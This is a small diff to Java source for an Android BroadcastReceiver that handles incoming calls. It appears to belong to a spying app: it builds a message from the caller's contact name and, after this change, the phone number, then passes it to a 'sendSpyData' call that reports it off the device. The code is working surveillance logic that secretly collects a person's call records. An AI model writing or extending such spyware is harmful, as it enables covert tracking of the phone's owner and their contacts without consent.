@@ -46,7 +46,7 @@ public class IncomingCall extends BroadcastReceiver
                             
                             Log.i(SetupActivity.TAG,"Incoming #: " + contact);
                             
-                            String title = "Incoming Call from " + contact;
+                            String title = "Incoming Call from " + contact + " (" + phonenumber + ")";
                             String body = "";
                             String date = "";
             				client.sendSpyData(title, body, date);
